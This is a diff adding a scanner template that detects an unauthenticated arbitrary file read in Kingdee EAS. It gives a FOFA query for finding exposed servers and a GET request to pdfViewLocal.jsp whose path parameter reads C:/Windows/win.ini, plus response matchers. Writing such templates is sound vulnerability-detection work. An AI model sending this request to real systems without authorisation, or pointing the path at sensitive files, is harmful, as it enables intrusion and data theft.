@@ -1,0 +1,25 @@
+## id: VEID-2024-0101
+## name: 金蝶EAS_pdfviewlocal任意文件读取漏洞
+## author: hack007x
+## severity: medium
+## tags: veid,file,veid2024
+## description:金蝶应用服务器存在未授权文件读取漏洞
+## fofa-query: app="Apusic应用服务器"
+## verification: true
+
+
+GET /plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/win.ini HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "[fonts]" && body contains "[extensions]"
+
+
+
+
+
+# @VEIL-STAMP: 81416bd7ec8f60f71a3a486c44c032dc56143c4be95c7efeb5bf9f5ef7198aed
